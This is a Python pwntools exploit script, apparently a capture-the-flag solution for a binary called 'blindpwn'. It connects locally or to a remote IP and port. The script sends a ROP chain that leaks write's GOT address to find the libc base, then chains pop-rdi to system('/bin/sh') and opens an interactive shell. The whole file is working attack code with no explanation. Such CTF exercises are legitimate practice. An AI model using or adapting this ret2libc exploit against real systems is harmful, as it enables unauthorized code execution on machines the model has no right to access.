#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./blindpwn"
elf=ELF(pwn_file)
libc=elf.libc

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("34.92.37.22",10000)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

pop_rdi_ret = 0x400783
pop_rsi_r15_ret = 0x400781
bug = 0x400666
f = {
    0x28:p64(pop_rdi_ret),
    0x30:p64(1),
    0x38:p64(pop_rsi_r15_ret),
    0x40:p64(elf.got['write']),
    0x48:p64(0),
    0x50:p64(elf.plt['write']),
    0x58:p64(bug)
}
payload = fit(f,filler="\x00",length=0xa0) 

r.sendlineafter("Welcome to this blind pwn!\n", payload)
write_addr = u64(r.recv(6).ljust(8,'\x00'))

libc.address = write_addr - libc.sym['write']
info("libc.address: %16x", libc.address)
r.clean()

system = libc.sym['system']
binsh = libc.search("/bin/sh").next()
f2={
        0x28:p64(pop_rdi_ret),
        0x30:p64(binsh),
        0x38:p64(system)
}

payload2 = fit(f2,filler="\x00",length=0x50)
r.sendline(payload2)

r.interactive()
